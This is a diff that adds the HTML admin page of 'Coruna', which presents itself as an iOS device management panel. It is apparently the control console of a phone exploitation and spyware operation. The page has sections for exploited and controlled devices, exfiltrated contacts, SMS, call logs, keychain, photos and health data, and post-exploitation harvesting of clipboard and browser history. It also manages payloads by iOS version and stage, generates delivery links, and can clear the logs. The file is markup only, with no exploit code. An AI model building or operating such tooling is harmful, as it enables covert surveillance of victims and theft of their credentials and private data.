@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coruna 管理面板</title>
+    <link rel="stylesheet" href="/static/admin/css/style.css">
+</head>
+<body>
+    <div class="app-container">
+        <div id="loginPage" class="login-page">
+            <div class="login-box">
+                <div class="login-header">
+                    <h1>Coruna 管理系统</h1>
+                    <p>请登录以继续</p>
+                </div>
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label>用户名</label>
+                        <input type="text" id="loginUsername" required autocomplete="username">
+                    </div>
+                    <div class="form-group">
+                        <label>密码</label>
+                        <input type="password" id="loginPassword" required autocomplete="current-password">
+                    </div>
+                    <button type="submit" class="btn btn-primary btn-block">登录</button>
+                    <div class="login-error" id="loginError"></div>
+                </form>
+            </div>
+        </div>
+
+        <div id="mainApp" class="main-app" style="display: none;">
+            <header class="top-bar">
+                <div class="logo-section">
+                    <h1>Coruna 管理系统</h1>
+                    <span class="sub-title">iOS 设备管理平台</span>
+                </div>
+                <div class="top-right">
+                    <div class="connection-status" id="connectionStatus">
+                        <span class="status-dot"></span>
+                        <span class="status-text">连接中...</span>
+                    </div>
+                    <div class="user-info">
+                        <span id="currentUsername">管理员</span>
+                        <button class="logout-btn" id="logoutBtn">退出登录</button>
+                    </div>
+                </div>
+            </header>
+
+            <div class="content-wrapper">
+                <nav class="sidebar">
+                    <ul class="nav-menu">
+                        <li><a href="#dashboard" class="nav-item active" data-page="dashboard">
+                            <span class="nav-icon">📊</span>
+                            <span>仪表盘</span>
+                        </a></li>
+                        <li><a href="#devices" class="nav-item" data-page="devices">
+                            <span class="nav-icon">📱</span>
+                            <span>设备管理</span>
+                        </a></li>
+                        <li><a href="#tasks" class="nav-item" data-page="tasks">
+                            <span class="nav-icon">📋</span>
+                            <span>任务管理</span>
+                        </a></li>
+                        <li><a href="#exfil" class="nav-item" data-page="exfil">
+                            <span class="nav-icon">📁</span>
+                            <span>数据外泄</span>
+                        </a></li>
+                        <li><a href="#postexploit" class="nav-item" data-page="postexploit">
+                            <span class="nav-icon">🔍</span>
+                            <span>后渗透数据</span>
+                        </a></li>
+                        <li><a href="#payloads" class="nav-item" data-page="payloads">
+                            <span class="nav-icon">⚙️</span>
+                            <span>Payload管理</span>
+                        </a></li>
+                        <li><a href="#logs" class="nav-item" data-page="logs">
+                            <span class="nav-icon">📝</span>
+                            <span>日志查看</span>
+                        </a></li>
+                    </ul>
+                </nav>
+
+                <main class="main-content">
+                <div class="page-container">
+                    <div id="dashboardPage" class="page active">
+                        <div class="page-header">
+                            <h2>仪表盘</h2>
+                            <div class="header-actions">
+                                <button class="btn btn-primary" id="refreshBtn">🔄 刷新</button>
+                            </div>
+                        </div>
+                        <div class="stats-row">
+                            <div class="stat-card">
+                                <div class="stat-value" id="totalDevices">0</div>
+                                <div class="stat-label">总设备数</div>
+                            </div>
+                            <div class="stat-card stat-success">
+                                <div class="stat-value" id="onlineDevices">0</div>
+                                <div class="stat-label">在线设备</div>
+                            </div>
+                            <div class="stat-card stat-warning">
+                                <div class="stat-value" id="exploitedDevices">0</div>
+                                <div class="stat-label">已利用设备</div>
+                            </div>
+                            <div class="stat-card">
+                                <div class="stat-value" id="totalTasks">0</div>
+                                <div class="stat-label">总任务数</div>
+                            </div>
+                            <div class="stat-card">
+                                <div class="stat-value" id="pendingTasks">0</div>
+                                <div class="stat-label">待处理</div>
+                            </div>
+                            <div class="stat-card stat-success">
+                                <div class="stat-value" id="completedTasks">0</div>
+                                <div class="stat-label">已完成</div>
+                            </div>
+                        </div>
+                        <div class="grid-container">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h3>最近设备</h3>
+                                    <a href="#devices" class="view-all">查看全部</a>
+                                </div>
+                                <div class="card-body">
+                                    <table class="data-table">
+                                        <thead>
+                                            <tr>
+                                                <th>设备号</th>
+                                                <th>版本号</th>
+                                                <th>状态</th>
+                                                <th>最后上线</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody id="recentDevicesTable"></tbody>
+                                    </table>
+                                </div>
+                            </div>
+                            <div class="card">
+                                <div class="card-header">
+                                    <h3>最近任务</h3>
+                                    <a href="#tasks" class="view-all">查看全部</a>
+                                </div>
+                                <div class="card-body">
+                                    <table class="data-table">
+                                        <thead>
+                                            <tr>
+                                                <th>任务ID</th>
+                                                <th>类型</th>
+                                                <th>设备</th>
+                                                <th>状态</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody id="recentTasksTable"></tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="devicesPage" class="page">
+                        <div class="page-header">
+                            <h2>设备管理</h2>
+                            <div class="header-actions">
+                                <div class="search-box">
+                                    <input type="text" id="deviceSearch" placeholder="搜索设备号...">
+                                    <button class="btn btn-primary" id="deviceSearchBtn">搜索</button>
+                                </div>
+                                <select id="deviceStatusFilter" class="filter-select">
+                                    <option value="">全部状态</option>
+                                    <option value="online">在线</option>
+                                    <option value="offline">离线</option>
+                                    <option value="exploited">已利用</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <div class="card-body">
+                                <table class="data-table">
+                                    <thead>
+                                        <tr>
+                                            <th>设备号</th>
+                                            <th>版本号</th>
+                                            <th>芯片</th>
+                                            <th>状态</th>
+                                            <th>受控</th>
+                                            <th>最后上线</th>
+                                            <th>操作</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="devicesTable"></tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="tasksPage" class="page">
+                        <div class="page-header">
+                            <h2>任务管理</h2>
+                            <div class="header-actions">
+                                <button class="btn btn-primary" id="createTaskBtn">➕ 创建任务</button>
+                                <div class="search-box">
+                                    <input type="text" id="taskSearch" placeholder="搜索任务...">
+                                    <button class="btn btn-primary" id="taskSearchBtn">搜索</button>
+                                </div>
+                                <select id="taskStatusFilter" class="filter-select">
+                                    <option value="">全部状态</option>
+                                    <option value="pending">待处理</option>
+                                    <option value="running">运行中</option>
+                                    <option value="completed">已完成</option>
+                                    <option value="failed">失败</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <div class="card-body">
+                                <table class="data-table">
+                                    <thead>
+                                        <tr>
+                                            <th>任务ID</th>
+                                            <th>类型</th>
+                                            <th>设备号</th>
+                                            <th>状态</th>
+                                            <th>优先级</th>
+                                            <th>创建时间</th>
+                                            <th>操作</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="tasksTable"></tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="exfilPage" class="page">
+                        <div class="page-header">
+                            <h2>数据外泄</h2>
+                            <div class="header-actions">
+                                <div class="search-box">
+                                    <input type="text" id="exfilSearch" placeholder="搜索外泄数据...">
+                                    <button class="btn btn-primary" id="exfilSearchBtn">搜索</button>
+                                </div>
+                                <select id="exfilCategoryFilter" class="filter-select">
+                                    <option value="">全部类别</option>
+                                    <option value="contact">联系人</option>
+                                    <option value="sms">短信</option>
+                                    <option value="call">通话记录</option>
+                                    <option value="keychain">钥匙串</option>
+                                    <option value="photo">照片</option>
+                                    <option value="wifi">WiFi</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <div class="card-body">
+                                <table class="data-table">
+                                    <thead>
+                                        <tr>
+                                            <th>ID</th>
+                                            <th>设备号</th>
+                                            <th>类别</th>
+                                            <th>文件大小</th>
+                                            <th>创建时间</th>
+                                            <th>操作</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="exfilTable"></tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="postexploitPage" class="page">
+                        <div class="page-header">
+                            <h2>后渗透数据</h2>
+                            <div class="header-actions">
+                                <input type="text" id="postexploitDeviceUuid" placeholder="输入设备UUID" class="search-box" style="width: 250px;">
+                                <select id="postexploitCategory" class="filter-select">
+                                    <option value="contacts">联系人</option>
+                                    <option value="sms">短信</option>
+                                    <option value="calls">通话记录</option>
+                                    <option value="keychain">钥匙串</option>
+                                    <option value="photos">照片</option>
+                                    <option value="clipboard">剪贴板</option>
+                                    <option value="apps">应用列表</option>
+                                    <option value="processes">进程列表</option>
+                                    <option value="wifi">WiFi网络</option>
+                                    <option value="browser_history">浏览器历史</option>
+                                    <option value="calendar">日历事件</option>
+                                    <option value="notes">笔记</option>
+                                    <option value="health">健康数据</option>
+                                </select>
+                                <button class="btn btn-primary" id="loadPostexploitBtn">加载数据</button>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <div class="card-body">
+                                <div id="postexploitContent"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="logsPage" class="page">
+                        <div class="page-header">
+                            <h2>日志查看</h2>
+                            <div class="header-actions">
+                                <div class="search-box">
+                                    <input type="text" id="logDeviceFilter" placeholder="设备号...">
+                                    <button class="btn btn-primary" id="logFilterBtn">筛选</button>
+                                </div>
+                                <select id="logLevelFilter" class="filter-select">
+                                    <option value="">全部级别</option>
+                                    <option value="INFO">INFO</option>
+                                    <option value="WARNING">WARNING</option>
+                                    <option value="ERROR">ERROR</option>
+                                    <option value="DEBUG">DEBUG</option>
+                                </select>
+                                <button class="btn btn-danger" id="deleteSelectedLogs">🗑️ 删除选中</button>
+                                <button class="btn btn-warning" id="clearAllLogs">🗑️ 清空全部</button>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <div class="card-body">
+                                <div style="margin-bottom: 10px; display: flex; align-items: center; gap: 15px;">
+                                    <span id="selectedCount" style="color: #6b7280;">已选择: 0</span>
+                                </div>
+                                <div class="log-container" id="logContainer"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="payloadsPage" class="page">
+                        <div class="page-header">
+                            <h2>Payload管理</h2>
+                            <div class="header-actions">
+                                <button class="btn btn-primary" id="uploadPayloadBtn">📤 上传Payload</button>
+                                <button class="btn btn-secondary" id="generateLinkBtn">🔗 生成链接</button>
+                                <select id="payloadVersionFilter" class="filter-select">
+                                    <option value="">全部版本</option>
+                                </select>
+                                <select id="payloadStageFilter" class="filter-select">
+                                    <option value="">全部阶段</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <div class="card-body">
+                                <table class="data-table">
+                                    <thead>
+                                        <tr>
+                                            <th>名称</th>
+                                            <th>文件名</th>
+                                            <th>iOS版本</th>
+                                            <th>阶段</th>
+                                            <th>大小</th>
+                                            <th>上传时间</th>
+                                            <th>操作</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="payloadsTable"></tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </main>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="modalTitle">标题</h3>
+                <button class="close-btn" id="modalClose">&times;</button>
+            </div>
+            <div class="modal-body" id="modalBody"></div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script src="/static/admin/js/app.js"></script>
+</body>
+</html>
